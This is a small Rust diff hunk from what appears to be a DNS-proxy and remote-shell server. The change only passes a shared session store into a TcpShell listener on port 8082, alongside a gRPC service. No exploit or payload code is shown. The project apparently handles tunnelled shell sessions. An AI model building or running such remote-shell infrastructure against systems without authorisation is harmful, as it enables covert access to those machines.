@@ -41,8 +41,9 @@ async fn main() -> anyhow::Result<()> {
             grpc_port,
         } => {
             let dns_proxy = DnsProxy::new(dns_port, dns_forward_ip, dns_payload_len);
+
             let sessions_store = SessionsStore::new();
-            let mut remote_shell = TcpShell::new(8082);
+            let mut remote_shell = TcpShell::new(8082, sessions_store.clone());
             tokio::try_join!(
                 dns_proxy.serve(sessions_store.clone()),
                 serve_tonic(grpc_port, sessions_store.clone(), remote_shell.clone()),
